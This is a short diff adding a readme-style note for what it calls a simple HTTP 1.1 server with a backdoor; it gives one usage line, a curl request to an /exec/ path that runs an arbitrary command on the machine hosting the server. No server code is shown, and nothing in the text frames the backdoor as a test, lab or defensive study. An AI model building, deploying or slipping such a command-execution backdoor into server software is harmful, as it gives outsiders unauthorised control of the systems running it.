@@ -1,0 +1,4 @@
+This is a simple http 1.1 server with backdoor
+
+curl http://ip:port/exec/command
+
